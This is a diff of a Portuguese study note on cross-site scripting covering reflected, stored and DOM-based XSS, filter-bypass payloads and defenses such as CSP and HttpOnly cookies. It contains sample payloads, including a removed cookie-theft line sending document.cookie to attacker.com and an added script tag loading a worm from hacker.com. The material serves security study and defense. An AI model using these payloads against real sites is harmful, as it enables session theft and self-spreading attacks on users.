@@ -16,25 +16,26 @@ O payload é enviado via parâmetro na URL e "reflete" na resposta da página.
 ### 2. 💾 XSS Armazenado (Stored) - O Pesadelo!
 O script malicioso é salvo permanentemente no servidor (banco de dados, logs, fóruns).
 - **Vetor**: Postagens em redes sociais, perfis de usuário, campos de endereço.
-- **Exemplo**: Um atacante altera seu "Nome de Usuário" para um script. Sempre que alguém visualizar o perfil dele, o script executa.
-- **Característica**: Afeta múltiplos usuários sem necessidade de interação direta via link.
+- **Impacto**: Como o código está no servidor, qualquer pessoa que visite a página será infectada automaticamente. É o tipo de XSS usado para criar "Worms" em redes sociais.
+- **Exemplo**: Um atacante altera seu "Nome de Usuário" para `<script src="http://hacker.com/worm.js"></script>`.
 
-### 3. 🌳 XSS Baseado em DOM
+### 3. 🌳 XSS Baseado em DOM (Document Object Model)
 A vulnerabilidade existe inteiramente no código JavaScript do lado do cliente (client-side).
-- **Como ocorre**: O JS lê dados de uma fonte insegura (como `location.hash`) e os escreve na página usando funções perigosas como `innerHTML` ou `eval()`.
-- **Característica**: O payload pode nunca chegar ao servidor, tornando-o invisível para alguns WAFs.
+- **Como ocorre**: O JS lê dados de uma "Source" (fonte) insegura (como `location.hash`) e os passa para um "Sink" (sumidouro) perigoso como `innerHTML`, `document.write()` ou `eval()`.
+- **Exemplo**: `var name = decodeURIComponent(window.location.hash.substring(1)); document.getElementById('welcome').innerHTML = name;`
+- **Ataque**: `http://site.com/#<img src=x onerror=alert(1)>`
 
-## 🧪 Payloads Úteis para Testes:
-- **Básico**: `<script>alert(1)</script>`
-- **Bypass de Filtro**: `<img src=x onerror=alert(1)>`
-- **Roubo de Cookie**: `<script>fetch('https://attacker.com/log?c=' + document.cookie)</script>`
-- **Keylogger**: Injetar um script que captura cada tecla digitada e envia para o atacante.
+## 🧪 Técnicas de Bypass de Filtros (WAF Bypass)
+Atacantes usam criatividade quando o básico `<script>` é bloqueado:
+- **Event Handlers**: `<svg onload=alert(1)>`, `<body onscroll=alert(1)>`, `<details open ontoggle=alert(1)>`.
+- **Ofuscação**: Usar codificação decimal ou hexadecimal: `&#60;script&#62;alert(1)&#60;/script&#62;`.
+- **JavaScript Pseudoprotocol**: `<a href="javascript:alert(1)">Clique aqui</a>`.
 
 ## 🛡️ Estratégias de Defesa (Blue Team)
-1. **Saída Segura (Output Encoding)**: Converter caracteres especiais em entidades HTML (ex: `<` vira `&lt;`). Use bibliotecas como OWASP Java Encoder.
-2. **CSP (Content Security Policy)**: Um header HTTP que restringe de onde os scripts podem ser carregados e executados.
-3. **HttpOnly Flags**: Marcar cookies sensíveis como `HttpOnly` impede que o JavaScript os acesse via `document.cookie`.
-4. **Validar e Sanitizar**: Use bibliotecas como `DOMPurify` para limpar HTML vindo de usuários.
+1. **Context-Aware Output Encoding**: Não use a mesma codificação para tudo. Codificar para HTML é diferente de codificar para um atributo de tag ou para dentro de um bloco `<script>`.
+2. **CSP (Content Security Policy)**: O header definitivo. Exemplo: `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com`. Isso proíbe scripts inline e domínios não autorizados.
+3. **HttpOnly Flags**: Marcar cookies sensíveis como `HttpOnly` impede que o JavaScript os acesse via `document.cookie`, mitigando o roubo de sessão mesmo se houver XSS.
+4. **Utilizar Frameworks Modernos**: React, Angular e Vue fazem o escaping automático por padrão (mas cuidado com funções como `dangerouslySetInnerHTML`).
 
 ---
 **Tags:** `XSS`, `JavaScript-Security`, `Client-Side`, `Payloads`, `CSP`, `Session-Hijacking`
